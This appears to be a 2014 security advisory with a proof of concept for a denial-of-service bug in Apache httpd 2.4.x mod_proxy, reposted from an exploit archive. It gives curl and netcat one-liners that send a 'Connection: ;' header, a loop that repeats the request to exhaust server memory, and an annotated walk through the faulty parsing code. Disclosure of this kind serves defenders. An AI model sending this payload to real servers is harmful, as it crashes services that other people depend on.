@@ -1,0 +1,146 @@
+id: 22467
+date: 07/23/2014
+title: Apache 2.4.x mod_proxy Denial Of Service
+author: Marek Kroemeke
+cves: 
+
+Software: apache httpd 2.4.7 , possibly others from 2.3 and 2.4 branches.
+
+If apache is configured with mod_proxy module (for example in front of
+a tomcat, or proxypassing requests to other backend servers), it is possible
+to use all available memory on the server and potenatially cause an OOM
+condition that requires a reboot. In our tests, a single requests was causing
+apache to spin and keep allocating memory (gigabytes in seconds). A simple bash
+script that does this X time can speed the process up.
+
+Bug can be triggered in request or response.
+
+PoC (request):
+-- cut --
+curl -H 'Connection: ;' http://127.0.0.1/
+-- cut --
+
+PoC (response):
+printf "HTTP/1.1 200 OK\r\nConnection: ;\r\n\r\n" | nc -l -p 80
+
+
+Example config to replicate it, in httpd.conf :
+-- cut --
+<Proxy balancer://mycluster>
+BalancerMember http://127.0.0.1:8100
+</Proxy>
+ProxyPass / balancer://mycluster
+-- cut --
+
+then listen on port 8100 :
+-- cut --
+nc -l -p 8100
+-- cut --
+
+Then send a request with "Connection: ;" header and watch the memory usage.
+-- cut --
+curl -H 'Connection: ;' http://127.0.0.1/
+-- cut --
+
+Single request will usually get killed with the following message:
+-- cut --
+[crit] Memory allocation failed, aborting process.
+[core:notice] [pid 3205:tid 139786428621120] AH00051: child pid 4212 exit signal Aborted (6), possible coredump in
+-- cut --
+
+hence it may be more visible on machines with huge ram by running more requests, ideally
+concurrently but this should do as well for demonstration purposes:
+-- cut --
+for i in `seq 1 100` ; do curl -m 1 -H 'Connection: ;' http://127.0.0.1/ ; done
+-- cut --
+
+
+Now where the problem is : incorrect parsing in find_conn_headers , it only moves
+the pointer when it encounters a comma, and calls ap_get_token which returns an empty
+string as it skips over ';'.
+
+
+// key == 'Connection'
+// val == ';'
+
+static int find_conn_headers(void *data, const char *key, const char *val)
+{
+header_connection *x = data;
+const char *name;
+
+do {
+while (*val == ',') { // jump over expected comma separator
+val++;
+}
+name = ap_get_token(x->pool, &val, 0); // returns empty string in our case
+if (!strcasecmp(name, "close")) { // not mached, branch not taken
+x->closed = 1;
+}
+if (!x->first) { // branch taken
+x->first = name; // "" as name is empty
+}
+else { // branch not taken due to above
+const char **elt;
+if (!x->array) {
+x->array = apr_array_make(x->pool, 4, sizeof(char *));
+}
+elt = apr_array_push(x->array);
+*elt = name;
+}
+} while (*val); // val is still ';'
+
+return 1;
+}
+
+/* Retrieve a token, spacing over it and returning a pointer to
+* the first non-white byte afterwards. Note that these tokens
+* are delimited by semis and commas; and can also be delimited
+* by whitespace at the caller's option.
+*/
+
+AP_DECLARE(char *) ap_get_token(apr_pool_t *p, const char **accept_line,
+int accept_white)
+{
+const char *ptr = *accept_line;
+const char *tok_start;
+char *token;
+int tok_len;
+
+/* Find first non-white byte */
+
+while (apr_isspace(*ptr))
+++ptr;
+
+tok_start = ptr; // ';'
+
+/* find token end, skipping over quoted strings.
+* (comments are already gone).
+*/
+
+while (*ptr && (accept_white || !apr_isspace(*ptr))
+&& *ptr != ';' && *ptr != ',') { // not satisfied as ';'
+if (*ptr++ == '"') // skips the if itself
+while (*ptr)
+if (*ptr++ == '"')
+break;
+}
+
+tok_len = ptr - tok_start; // 0
+token = apr_pstrndup(p, tok_start, tok_len); // token = ""
+
+/* Advance accept_line pointer to the next non-white byte */
+
+while (apr_isspace(*ptr)) // not a space
+++ptr;
+
+*accept_line = ptr;
+return token;
+}
+
+
+We hope you enjoyed it.
+
+Regards,
+Marek Kroemeke, AKAT-1 and 22733db72ab3ed94b5f8a1ffcde850251fe6f466
+
+#  0day.today [2023-03-27]  #
